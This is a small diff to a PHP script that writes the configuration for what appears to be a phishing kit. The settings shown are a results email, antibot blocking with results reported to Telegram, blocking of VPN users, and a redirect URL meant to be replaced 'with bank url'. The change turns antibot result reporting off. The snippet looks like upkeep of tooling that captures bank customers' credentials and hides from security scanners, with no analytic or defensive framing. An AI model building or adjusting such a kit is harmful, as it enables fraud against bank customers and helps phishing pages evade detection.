@@ -37,7 +37,7 @@ if ($adder == "442577002800") {
     $data .= '$Email = "";' . PHP_EOL . PHP_EOL;
     $data .= '##### ANTIBOT #####' . PHP_EOL . PHP_EOL;
     $data .= '//You can change with (off) for stop antibot block results. Note: Antibot Result Only Telegram.' . PHP_EOL;
-    $data .= '$AntibotResult = "on";' . PHP_EOL . PHP_EOL;
+    $data .= '$AntibotResult = "off";' . PHP_EOL . PHP_EOL;
     $data .= '//You can change with (off) for vpn user unblocking.' . PHP_EOL;
     $data .= '$VpnBlock = "on";' . PHP_EOL . PHP_EOL;
     $data .= '//You Change this url with bank url or other url.' . PHP_EOL;
